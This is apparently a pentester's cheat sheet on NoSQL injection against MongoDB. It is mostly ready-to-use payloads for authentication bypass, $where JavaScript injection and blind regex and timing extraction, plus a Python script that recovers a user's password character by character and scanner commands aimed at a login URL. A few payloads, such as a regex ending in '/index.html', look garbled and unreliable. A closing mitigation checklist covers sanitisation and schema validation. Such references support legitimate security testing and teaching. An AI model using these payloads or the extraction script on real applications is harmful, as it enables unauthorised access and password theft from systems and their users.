---
tags:
  - critical
  - server-side
---

# NoSQL Injection

## TL;DR

Exploit NoSQL databases (primarily MongoDB) by injecting operators or JavaScript.

```javascript
{"username": {"$ne": null}, "password": {"$ne": null}}
```

## Detection

### Operator Injection

```javascript
// URL Parameters
username[$ne]=admin&password[$ne]=pass
username[$gt]=&password[$gt]=
username[$regex]=.*&password[$regex]=.*

// JSON Body
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
```

### JavaScript Injection ($where)

```javascript
' || 1==1//
' || 1==1%00
admin' || 'a'=='a
```

## MongoDB Operators

### Comparison

```javascript
$eq   // Equal
$ne   // Not equal
$gt   // Greater than
$lt   // Less than
$in   // In array
$nin  // Not in array
```

### Evaluation

```javascript
$regex  // Regular expression
$where  // JavaScript expression
$expr   // Expression evaluation
```

## Authentication Bypass

### Basic Bypass

```javascript
// URL Parameters
username[$ne]=invalid&password[$ne]=invalid

// JSON Body
{"username": {"$ne": ""}, "password": {"$ne": ""}}
```

### Regex Bypass

```javascript
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}
```

### $where Tautology

```javascript
{"$where": "1 == 1"}
{"$where": "this.password.match(/.*/index.html)"}

// String termination
' || 1==1//
admin' || 'a'=='a
```

## Blind NoSQL Injection

### Boolean-Based (Regex)

```javascript
// Determine password length
{"username": "admin", "password": {"$regex": ".{1}"}}   // len >= 1
{"username": "admin", "password": {"$regex": ".{5}"}}   // len >= 5

// Extract char by char
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^ab"}}
{"username": "admin", "password": {"$regex": "^abc"}}
```

### Time-Based

```javascript
{"$where": "sleep(5000)"}
{"$where": "if(this.password.match(/^a/)){sleep(5000)}"}
```

## Extraction Script

```python
import requests
import string

target = "http://target.com/login"
chars = string.ascii_lowercase + string.digits

def extract_password(username):
    password = ""
    while True:
        found = False
        for char in chars:
            payload = {
                "username": username,
                "password": {"$regex": f"^{password}{char}"}
            }
            r = requests.post(target, json=payload)
            if "success" in r.text:
                password += char
                print(f"[+] Password: {password}")
                found = True
                break
        if not found:
            break
    return password
```

## $lookup Aggregation

Access other collections (if `aggregate()` is used):

```json
[{
  "$lookup": {
    "from": "users",
    "as": "result",
    "pipeline": [{
      "$match": {"password": {"$regex": ".*"}}
    }]
  }
}]
```

## PHP Array Injection

Convert parameters to arrays:

```
username=admin → username[$ne]=invalid
password=pass → password[$ne]=invalid
```

PHP interprets `param[$key]=value` as array.

## Payload List

```javascript
// Boolean
{"$gt": ""}
{"$ne": null}
{"$ne": "x"}
{"$gte": ""}

// Regex
{"$regex": ".*"}
{"$regex": "^a"}
{"$regex": ".{5}"}

// Or/And
{"$or": [{"admin": 1}, {"admin": {"$gt": ""}}]}

// Where
{"$where": "1==1"}
{"$where": "this.password.match(/.*/index.html)"}

// Exists
{"$exists": true}
```

## URL Encoding

```
username%5B%24ne%5D=x  // username[$ne]=x
password%5B%24gt%5D=   // password[$gt]=
```

## Real-World CVEs

- **CVE-2023-28359 (Rocket.Chat):** `{"$where": "sleep(2000)||true"}`
- **CVE-2024-53900 (Mongoose):** RCE via populate().match

## Tools

```bash
# NoSQLMap
python nosqlmap.py -u "http://target/login" --attack 1

# nosqli
nosqli scan -t http://target/login
```

## Mitigation Checklist

- Strip keys starting with `$` (use `mongo-sanitize`)
- Disable server-side JavaScript (`--noscripting`)
- Validate data types strictly
- Use Mongoose `sanitizeFilter: true`
- Validate against schema (Joi, Ajv, Zod)
